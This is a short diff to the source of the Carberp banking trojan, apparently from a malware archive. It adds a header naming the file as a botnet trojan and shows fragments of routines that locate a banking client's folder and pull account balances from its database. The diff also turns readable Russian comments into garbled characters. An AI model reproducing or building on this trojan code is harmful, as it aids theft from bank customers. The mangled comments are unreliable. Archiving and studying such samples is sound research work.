@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <tlhelp32.h>
@@ -128,7 +139,7 @@ static char *GrabBalance(char *lpPath)
             SQLRETURN dwRet;
             while (((dwRet=(SQLRETURN)pSQLFetch(hBalance)) == SQL_SUCCESS) || (dwRet == SQL_SUCCESS_WITH_INFO))
             {
-				//конвертируем число в строку
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				char szRest[16], buf[16];
 				int i = 0;
 				if( Rest < 0 )
@@ -209,8 +220,8 @@ void WINAPI ThreadBBS(void*)
 			if( id )
 			{
 				idCBank = id;
-				pPathRemoveFileSpecA(path); //убираем имя файла
-				pPathRemoveFileSpecA(path); //убираем папку EXE
+				pPathRemoveFileSpecA(path); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+				pPathRemoveFileSpecA(path); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ EXE
 				char* sum = GrabBalance(path);
 				OutputDebugString( sum ? sum : "null" );
 				MemFree(sum);
